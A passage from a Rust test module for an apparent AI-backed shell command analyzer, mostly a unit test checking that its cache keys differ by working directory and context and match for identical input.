                      "Error '{}' should have severity {:?}, got {:?}",
                      error, expected_severity, severity);
        }
    }

    #[test]
    fn test_cache_key_uniqueness() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);
        
        let entry1 = CommandEntry {
            command: "ls -la".to_string(),
            timestamp: Utc::now(),
            exit_code: Some(0),
            working_directory: "/home/user".to_string(),
            shell: "bash".to_string(),
            output: None,
            error: None,
        };
        
        let entry2 = CommandEntry {
            command: "ls -la".to_string(),
            timestamp: Utc::now(),
            exit_code: Some(0),
            working_directory: "/home/other".to_string(), // Different directory
            shell: "bash".to_string(),
            output: None,
            error: None,
        };
        
        let key1 = analyzer.create_cache_key(&entry1, Some("context"));
        let key2 = analyzer.create_cache_key(&entry2, Some("context"));
        let key3 = analyzer.create_cache_key(&entry1, Some("different context"));
        
        // Different working directories should produce different keys
        assert_ne!(key1, key2);
        
        // Different contexts should produce different keys
        assert_ne!(key1, key3);
        
        // Same entry and context should produce same key
        let key1_duplicate = analyzer.create_cache_key(&entry1, Some("context"));
        assert_eq!(key1, key1_duplicate);
    }
}